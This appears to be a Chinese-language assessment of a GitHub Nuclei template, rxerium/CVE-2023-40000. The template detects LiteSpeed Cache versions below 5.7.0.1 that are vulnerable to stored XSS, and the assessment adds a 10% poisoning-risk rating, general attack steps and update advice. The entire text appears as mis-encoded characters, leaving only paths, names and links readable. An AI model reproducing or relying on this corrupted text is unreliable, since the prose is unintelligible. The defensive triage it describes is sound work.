æä¾›çš„Nucleiæ¨¡æ¿æ—¨åœ¨é€šè¿‡æ£€æŸ¥`/wp-content/plugins/litespeed-cache/readme.txt`æ–‡ä»¶çš„`Stable Tag`æ¥æ£€æµ‹æ˜“å—æ”»å‡»çš„LiteSpeed Cacheæ’ä»¶ç‰ˆæœ¬ã€‚å¦‚æœæ£€æµ‹åˆ°çš„ç‰ˆæœ¬ä½äº5.7.0.1ï¼Œåˆ™è¯¥æ’ä»¶è¢«è®¤ä¸ºæ˜¯æ˜“å—æ”»å‡»çš„ã€‚è¿™ä¸ªæ–¹æ³•ç›¸å¯¹æœ‰æ•ˆï¼Œå› ä¸ºå®ƒç›´æ¥æ£€æŸ¥äº†æ’ä»¶çš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œæ¼æ´åˆ©ç”¨ä»£ç é€šè¿‡ç‰ˆæœ¬åˆ¤æ–­æ¥ç¡®å®šæ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œå…·æœ‰ä¸€å®šçš„å‡†ç¡®æ€§ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**

Nucleiæ¨¡æ¿æœ¬èº«ä¸»è¦ç”¨äºæ¼æ´æ£€æµ‹ï¼Œé£é™©ç›¸å¯¹è¾ƒå°ã€‚LICENSEæ–‡ä»¶å£°æ˜æ˜¯MIT Licenseï¼Œçœ‹èµ·æ¥æ²¡æœ‰æ¶æ„ï¼ŒREADMEæ–‡ä»¶ä»…æè¿°äº†å¦‚ä½•ä½¿ç”¨è¯¥æ¨¡æ¿ã€‚

å¯èƒ½çš„é£é™©ç‚¹åœ¨äºï¼š

1.  **æ¨¡æ¿é€»è¾‘é”™è¯¯ï¼š** è™½ç„¶æ£€æµ‹é€»è¾‘ç®€å•ï¼Œä½†å¦‚æœæ¨¡æ¿ç¼–å†™å­˜åœ¨é”™è¯¯ï¼Œå¯èƒ½ä¼šå¯¼è‡´è¯¯æŠ¥æˆ–æ¼æŠ¥ã€‚ä¾‹å¦‚ï¼ŒregexåŒ¹é…é”™è¯¯æˆ–è€…compare_versionså‡½æ•°çš„bugã€‚
2.  **ä¾èµ–Nucleiæœ¬èº«ï¼š** æ¨¡æ¿ä¾èµ–Nucleiè¿è¡Œï¼Œå¦‚æœNucleiç¨‹åºæœ¬èº«å­˜åœ¨æ¼æ´ï¼Œå¯èƒ½ä¼šè¢«åˆ©ç”¨ã€‚

æ€»ä½“è¯„ä¼°ï¼Œè¯¥POCæœ¬èº«ç›´æ¥æŠ•æ¯’çš„å¯èƒ½æ€§è¾ƒä½ï¼Œä¸»è¦æ˜¯ä½¿ç”¨ä¸å½“æˆ–è€…è¯¯æŠ¥çš„é£é™©ã€‚æŠ•æ¯’é£é™©è¯„ä¼°ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ¼æ´æ£€æµ‹ï¼š** ä½¿ç”¨Nucleiç­‰å·¥å…·åŠ è½½æä¾›çš„YAMLæ¨¡æ¿ï¼Œæ‰«æç›®æ ‡WordPressç«™ç‚¹ã€‚
2.  **ç‰ˆæœ¬åˆ¤æ–­ï¼š** æ¨¡æ¿ä¼šè¯»å–`/wp-content/plugins/litespeed-cache/readme.txt`æ–‡ä»¶ï¼Œå¹¶æå–æ’ä»¶ç‰ˆæœ¬ä¿¡æ¯ã€‚
3.  **æ¼æ´ç¡®è®¤ï¼š** å¦‚æœæ£€æµ‹åˆ°çš„ç‰ˆæœ¬ä½äº5.7.0.1ï¼Œåˆ™è¡¨æ˜è¯¥ç«™ç‚¹å¯èƒ½å­˜åœ¨CVE-2023-40000æ¼æ´ã€‚
4.  **æ”»å‡»å®æ–½ï¼š**ç”±äºæ˜¯å­˜å‚¨å‹XSSï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ç‰¹å®šæ–¹å¼ï¼ˆå…·ä½“æ³¨å…¥ç‚¹éœ€è¦è¿›ä¸€æ­¥åˆ†æï¼‰ï¼Œå°†æ¶æ„JavaScriptä»£ç å­˜å‚¨åˆ°æ•°æ®åº“ä¸­ã€‚å½“å…¶ä»–ç”¨æˆ·è®¿é—®åŒ…å«è¯¥æ¶æ„ä»£ç çš„é¡µé¢æ—¶ï¼ŒXSSæ¼æ´å°†è¢«è§¦å‘ã€‚

**ç¼“è§£æªæ–½ï¼š**

*   å°†LiteSpeed Cacheæ’ä»¶æ›´æ–°åˆ°5.7.0.1æˆ–æ›´é«˜ç‰ˆæœ¬ã€‚
*   å®æ–½ä¸¥æ ¼çš„è¾“å…¥éªŒè¯å’Œè¾“å‡ºç¼–ç ï¼Œé˜²æ­¢XSSæ”»å‡»ã€‚

**é¡¹ç›®åœ°å€:** [rxerium/CVE-2023-40000](https://github.com/rxerium/CVE-2023-40000)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-40000](https://nvd.nist.gov/vuln/detail/CVE-2023-40000)

---

